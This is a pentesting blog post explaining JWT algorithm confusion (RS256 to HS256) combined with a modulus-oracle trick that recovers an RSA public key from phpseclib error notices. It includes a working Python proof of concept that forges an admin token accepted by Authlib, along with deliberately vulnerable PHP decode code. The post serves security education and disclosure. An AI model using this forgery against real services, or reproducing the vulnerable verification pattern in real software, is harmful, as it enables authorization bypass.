---
layout: post
title: "Modulus Oracle & JWT"
author: "RoP Team"
description: "Breaking a vulnerable JWT with a Modulus Oracle"
keywords: "RSA, JWT, crypto, oracle, modulus"
date: 2020-06-21 00:00:00 -0500
categories: pentesting
lang: en
lang-ref: modulus-oracle-part2
---

In a [previous post][1] we told about the *Modulus Oracle Attack*. This technique exploits the ability to treat a *modulus error* as an oracle to infer the modulus value and rebuild the public key. Really, it should not be a problem. The public key is public anyway. But in certain cases to know the public key could be very useful. The following case is one of them.

<!--more-->

### JWT and the algorithm switch

[JWT][2] is a widely used technology for authorization in web applications. It allows us create and verify authorization tokens using cryptography to guarantee the token's integrity. However exists vulnerabilities in certain JWT implementations that allows us forge tokens and bypass authorization controls. An attack against some JWT libraries is detailed in [this post][3]. Today all these vulnerabilities should be fixed but it is still possible to find them with the help of a careless developer.

For example, is very easy to screw it up by using the python library [Authlib][4]. The following code shows how the `decode` function accepts in the same way a valid token and a forged one. We have `Authlib 0.14.3` (the latest to date)

```py
from base64 import urlsafe_b64encode as enc
from base64 import urlsafe_b64decode as dec
from Crypto.Hash import HMAC, SHA256
from Crypto.PublicKey import RSA
import json

from authlib.jose import jwt


# Generate a RSA keys pair
private_key = RSA.generate(1024)
public_key = private_key.publickey()

# Generate a valid RS256 signed token
valid_token = jwt.encode(
    {'alg': 'RS256'},
    {'admin': False},
    private_key.export_key()
)
print('VALID TOKEN: {}'.format(valid_token))

# Forging a HS256 signed token
header = enc(json.dumps({'alg': 'HS256'}).encode()).strip(b'=')
body = enc(json.dumps({'admin': True}).encode()).strip(b'=')
signature = enc(HMAC.new(
    public_key.export_key(),
    b'.'.join([header, body]),
    SHA256
).digest()).strip(b'=')
forged_token = b'.'.join([header, body, signature])
print('FORGED TOKEN: {}'.format(forged_token))

# decoding the valid token
data = jwt.decode(valid_token, public_key.export_key())
print('REAL DATA: {}'.format(data))

# decoding the forged token
data = jwt.decode(forged_token, public_key.export_key())
print('FAKE DATA: {}'.format(data))
```

**Output:**
```
VALID TOKEN: b'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2V9.eo7MNx1XBcZ5dw_EY4yTLrO0rSGkOODeUBapQ__QTx6NzbnF65Gre2hcRpBOx3Mq24AR4LNnG2Kso2EboeS7qNZbC8fiTxO7YlKufbHoOXy1-p5_31AhuvOewncksvhOb7F5Y0WZX5vmAdKv7MlOSZIlMwRvJaoSRbjqkfEC7Xc'
FORGED TOKEN: b'eyJhbGciOiAiSFMyNTYifQ.eyJhZG1pbiI6IHRydWV9.BlEUBfCRolm91O1gOSXPPSJJkmVXjsfiNY5JwNojdBY'
REAL DATA: {'admin': False}
FAKE DATA: {'admin': True}
```

Write vulnerable code could be a little more harder with other libraries but not impossible.

As you can see, to exploit this vulnerability we need the public key. We can use the public key from the SSL/TLS certificate but there is no guarantee that these keys be the same. So we had the idea to carry out a *Modulus Oracle Attack* to obtain the public key. We have searched for reasonably weak JWT libraries and vulnerable to *Modulus Oracle* and we found one.

### gree/jose

[gree/jose][5] is a JWT library for PHP. Old versions (<=2.2.0) of this library are vulnerable to algorithm switch. The current version (2.2.1) is not vulnerable but with the help of our developer it could be. If we look at [the patch][6] introduced in the current version we will see that HMAC algorithms are disallowed when the signing algorithm is autodetected by the library.  In this way vulnerable code is prevented when lazy coders forget specify the signing algorithm in the `verify` function. But our developer might think that it is a great idea to code his own utility class that autodetects the algorithm and write something like the following:

```php
class JWTUtil {
    function encode($data, $key, $algorithm='HS256') {
        $jwt = new JOSE_JWT($data);
        $jwt = $jwt->sign($key, $algorithm);
        return $jwt->toString();
    }
    
    function decode($token, $key) {
        try {
            $jwt = JOSE_JWT::decode($token);
            $jwt->verify($key, $jwt->header['alg']); // autodetect algorithm
        } catch (Exception $err) {
            return NULL;
        }
        return $jwt->claims;
    }
}
```

> **WARNING:** The previous code is **VULNERABLE** and is placed only for demonstration purposes.

### phpseclib

`gree/jose` internally depends on [phpseclib][7]. It is a library with pure-PHP implementations of cryptographic algorithms. Today the latest release is 2.0.27. If we go through the source code, we will see that the gree/jose's `JWT::verify` method reaches the phpseclib's `RSA::_rsavp1` method. Let's take a look the last one.

Source: [phpseclib github][8]
```php
function _rsavp1($s)
{
    if ($s->compare($this->zero) < 0 || $s->compare($this->modulus) > 0) {
        user_error('Signature representative out of range');
        return false;
    }
    return $this->_exponentiate($s);
}
```

As we can see, this method validates that the signature value (`$s`) is in the range $$[0, N]$$ (with $$N$$ as the modulus). When the signature is out of range, an user error is triggered and displayed on the web page as a **Notice** message. So we have an identifiable behavior to perform a Modulus Oracle attack.

> For errors to be displayed on the web page, the value of PHP's `display_errors` directive must be `On`.

Now we have all the pieces: a vulnerable JWT implementation and a Modulus Oracle. Let's move on to the demo.

### Demo

We have published in our [github repository][9] a vulnerable CTF-like application to demonstrate the described attack. You can try solving it by yourself or see the solution in the script `modulus-oracle-jwt.py`.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ygOps-lZaxc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<br>

Because web applications generally don't show errors, it is unlikely that we can use them to get a Modulus Oracle. But is possible to get a Modulus Oracle in another way.

To be continue...


[1]: https://blog.rop.la/en/pentesting/2020/06/15/modulus-oracle-part1.html
[2]: https://jwt.io/introduction/
[3]: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries
[4]: https://github.com/lepture/authlib
[5]: https://github.com/nov/jose-php
[6]: https://github.com/nov/jose-php/commit/1cce55e27adf0274193eb1cd74b927a398a3df4b
[7]: https://github.com/phpseclib/phpseclib
[8]: https://github.com/phpseclib/phpseclib/blob/2.0.27/phpseclib/Crypt/RSA.php#L2426
[9]: https://github.com/rop-la/modulus-oracle-jwt